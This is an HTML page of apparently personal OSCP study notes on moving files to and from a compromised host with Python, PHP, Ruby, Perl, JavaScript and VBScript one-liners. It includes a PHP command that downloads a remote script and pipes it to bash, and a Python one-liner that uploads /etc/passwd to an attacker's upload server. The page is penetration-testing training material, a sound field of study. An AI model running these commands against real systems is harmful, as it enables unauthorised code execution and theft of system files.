<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content='Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Letâ€™s see some examples:
Python 2 - Download Transferring Files with Code
cube111@local[/local]$ python2.7 -c &#39;import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; Python 3 - Download Transferring Files with Code
cube111@local[/local]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; PHP PHP is also very prevalent and provides multiple file transfer methods.'><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="Transferring Files with Code :: DrakonOps"><meta name=twitter:description content='Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Letâ€™s see some examples:
Python 2 - Download Transferring Files with Code
cube111@local[/local]$ python2.7 -c &#39;import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; Python 3 - Download Transferring Files with Code
cube111@local[/local]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; PHP PHP is also very prevalent and provides multiple file transfer methods.'><meta property="og:url" content="https://irfan123456789-hub.github.io/DrakonOps/oscp-notes/transferring-files-with-code/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="Transferring Files with Code :: DrakonOps"><meta property="og:description" content='Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Letâ€™s see some examples:
Python 2 - Download Transferring Files with Code
cube111@local[/local]$ python2.7 -c &#39;import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; Python 3 - Download Transferring Files with Code
cube111@local[/local]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; PHP PHP is also very prevalent and provides multiple file transfer methods.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="Transferring Files with Code :: DrakonOps"><meta itemprop=description content='Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Letâ€™s see some examples:
Python 2 - Download Transferring Files with Code
cube111@local[/local]$ python2.7 -c &#39;import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; Python 3 - Download Transferring Files with Code
cube111@local[/local]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")&#39; PHP PHP is also very prevalent and provides multiple file transfer methods.'><meta itemprop=wordCount content="772"><title>Transferring Files with Code :: DrakonOps</title>
<link href=../../images/logo.png?1762044492 rel=icon type=image/png><link href=../../DrakonOps/css/auto-complete/auto-complete.min.css?1762044492 rel=stylesheet><script src=../../DrakonOps/js/auto-complete/auto-complete.min.js?1762044492 defer></script><script src=../../DrakonOps/js/search-lunr.min.js?1762044492 defer></script><script src=../../DrakonOps/js/search.min.js?1762044492 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762044492"</script><script src=../../DrakonOps/js/lunr/lunr.min.js?1762044492 defer></script><script src=../../DrakonOps/js/lunr/lunr.stemmer.support.min.js?1762044492 defer></script><script src=../../DrakonOps/js/lunr/lunr.multi.min.js?1762044492 defer></script><script src=../../DrakonOps/js/lunr/lunr.en.min.js?1762044492 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../DrakonOps/fonts/fontawesome/css/fontawesome-all.min.css?1762044492 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../DrakonOps/fonts/fontawesome/css/fontawesome-all.min.css?1762044492 rel=stylesheet></noscript><link href=../../DrakonOps/css/perfect-scrollbar/perfect-scrollbar.min.css?1762044492 rel=stylesheet><link href=../../css/theme.min.css?1762044492 rel=stylesheet><link href=../../css/format-html.min.css?1762044492 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/transferring-files-with-code/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://irfan123456789-hub.github.io/DrakonOps",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../DrakonOps/css/custom.css?1762044492 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/transferring-files-with-code/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><a href=#python>Python</a><ul><li></li></ul></li><li><a href=#php>PHP</a><ul><li></li></ul></li><li><a href=#other-languages>Other Languages</a><ul><li></li></ul></li><li><a href=#javascript>JavaScript</a><ul><li></li></ul></li><li><a href=#vbscript>VBScript</a><ul><li></li></ul></li><li><a href=#upload-operations-using-python3>Upload Operations using Python3</a><ul><li></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Transferring Files with Code</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/living-off-the-land-file-transfer/index.html title="living off the land file transfer (ðŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/privilige-escalation/index.html title="privilige escalation (ðŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=transferring-files-with-code>Transferring Files with Code</h1><h2 id=python>Python</h2><p>Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. <code>Python</code> can run one-liners from an operating system command line using the option <code>-c</code>. Let&rsquo;s see some examples:</p><h4 id=python-2---download>Python 2 - Download</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ python2.7 -c &#39;import urllib;urllib.urlretrieve (&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;, &#34;LinEnum.sh&#34;)&#39;
</span></span></code></pre></div><h4 id=python-3---download>Python 3 - Download</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ python3 -c &#39;import urllib.request;urllib.request.urlretrieve(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;, &#34;LinEnum.sh&#34;)&#39;
</span></span></code></pre></div><hr><h2 id=php>PHP</h2><p><code>PHP</code> is also very prevalent and provides multiple file transfer methods. <a href=https://w3techs.com/technologies/details/pl-php rel=external>According to W3Techs&rsquo; data</a>, PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.</p><p>Let&rsquo;s see some examples of downloading files using PHP.</p><p>In the following example, we will use the PHP <a href=https://www.php.net/manual/en/function.file-get-contents.php rel=external>file_get_contents() module</a> to download content from a website combined with the <a href=https://www.php.net/manual/en/function.file-put-contents.php rel=external>file_put_contents() module</a> to save the file into a directory. <code>PHP</code> can be used to run one-liners from an operating system command line using the option <code>-r</code>.</p><h4 id=php-download-with-file_get_contents>PHP Download with File_get_contents()</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ php -r &#39;$file = file_get_contents(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;); file_put_contents(&#34;LinEnum.sh&#34;,$file);&#39;
</span></span></code></pre></div><p>An alternative to <code>file_get_contents()</code> and <code>file_put_contents()</code> is the <a href=https://www.php.net/manual/en/function.fopen.php rel=external>fopen() module</a>. We can use this module to open a URL, read it&rsquo;s content and save it into a file.</p><h4 id=php-download-with-fopen>PHP Download with Fopen()</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ php -r &#39;const BUFFER = 1024; $fremote = 
</span></span><span style=display:flex><span>fopen(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;, &#34;rb&#34;); $flocal = fopen(&#34;LinEnum.sh&#34;, &#34;wb&#34;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);&#39;
</span></span></code></pre></div><hr><p>We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.</p><h4 id=php-download-a-file-and-pipe-it-to-bash>PHP Download a File and Pipe it to Bash</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ php -r &#39;$lines = @file(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;); foreach ($lines as $line_num =&gt; $line) { echo $line; }&#39; | bash
</span></span></code></pre></div><p><strong>Note:</strong> The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.</p><hr><h2 id=other-languages>Other Languages</h2><p><code>Ruby</code> and <code>Perl</code> are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option <code>-e</code>.</p><hr><h4 id=ruby---download-a-file>Ruby - Download a File</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ruby -e &#39;require &#34;net/http&#34;; File.write(&#34;LinEnum.sh&#34;, Net::HTTP.get(URI.parse(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;)))&#39;
</span></span></code></pre></div><hr><h4 id=perl---download-a-file>Perl - Download a File</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ perl -e &#39;use LWP::Simple; getstore(&#34;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&#34;, &#34;LinEnum.sh&#34;);&#39;
</span></span></code></pre></div><hr><h2 id=javascript>JavaScript</h2><p>JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.</p><p>The following JavaScript code is based on <a href=https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068 rel=external>this</a> post, and we can download a file using it. We&rsquo;ll create a file called <code>wget.js</code> and save the following content:</p><p>Code: javascript</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>WinHttpReq</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ActiveXObject</span>(<span style=color:#e6db74>&#34;WinHttp.WinHttpRequest.5.1&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>WinHttpReq</span>.<span style=color:#a6e22e>Open</span>(<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#a6e22e>WScript</span>.<span style=color:#a6e22e>Arguments</span>(<span style=color:#ae81ff>0</span>), <span style=color:#75715e>/*async=*/</span><span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>WinHttpReq</span>.<span style=color:#a6e22e>Send</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>BinStream</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ActiveXObject</span>(<span style=color:#e6db74>&#34;ADODB.Stream&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>BinStream</span>.<span style=color:#a6e22e>Type</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>BinStream</span>.<span style=color:#a6e22e>Open</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>BinStream</span>.<span style=color:#a6e22e>Write</span>(<span style=color:#a6e22e>WinHttpReq</span>.<span style=color:#a6e22e>ResponseBody</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>BinStream</span>.<span style=color:#a6e22e>SaveToFile</span>(<span style=color:#a6e22e>WScript</span>.<span style=color:#a6e22e>Arguments</span>(<span style=color:#ae81ff>1</span>));</span></span></code></pre></div><p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.</p><h4 id=download-a-file-using-javascript-and-cscriptexe>Download a File Using JavaScript and cscript.exe</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1</code></pre></div><hr><h2 id=vbscript>VBScript</h2><p><a href=https://en.wikipedia.org/wiki/VBScript rel=external>VBScript</a> (&ldquo;Microsoft Visual Basic Scripting Edition&rdquo;) is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.</p><p>The following VBScript example can be used based on <a href=https://stackoverflow.com/questions/2973136/download-a-file-with-vbs rel=external>this</a>. We&rsquo;ll create a file called <code>wget.vbs</code> and save the following content:</p><p>Code: vbscript</p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-vbscript data-lang=vbscript>dim xHttp: Set xHttp = createobject(&#34;Microsoft.XMLHTTP&#34;)
dim bStrm: Set bStrm = createobject(&#34;Adodb.Stream&#34;)
xHttp.Open &#34;GET&#34;, WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with</code></pre></div><p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.</p><h4 id=download-a-file-using-vbscript-and-cscriptexe>Download a File Using VBScript and cscript.exe</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1</code></pre></div><p>Â </p><p>Â </p><h2 id=upload-operations-using-python3>Upload Operations using Python3</h2><p>Â </p><h4 id=starting-the-python-uploadserver-module>Starting the Python uploadserver Module</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ python3 -m uploadserver 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>File upload available at /upload
</span></span><span style=display:flex><span>Serving HTTP on 0.0.0.0 port 8000
</span></span></code></pre></div><p>Â </p><h4 id=uploading-a-file-using-a-python-one-liner>Uploading a File Using a Python One-liner</h4><p>Transferring Files with Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ python3 -c &#39;import requests;requests.post(&#34;http://192.168.49.128:8000/upload&#34;,files={&#34;files&#34;:open(&#34;/etc/passwd&#34;,&#34;rb&#34;)})&#39;
</span></span></code></pre></div><p>Â </p><p>Let&rsquo;s divide this one-liner into multiple lines to understand each piece better.</p><p>Code: python</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># To use the requests function, we need to import the module first.</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Define the target URL where we will upload the file.</span>
</span></span><span style=display:flex><span>URL <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://192.168.49.128:8000/upload&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Define the file we want to read, open it and save it in a variable.</span>
</span></span><span style=display:flex><span>file <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;/etc/passwd&#34;</span>,<span style=color:#e6db74>&#34;rb&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Use a requests POST request to upload the file. </span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url,files<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;files&#34;</span>:file})</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li 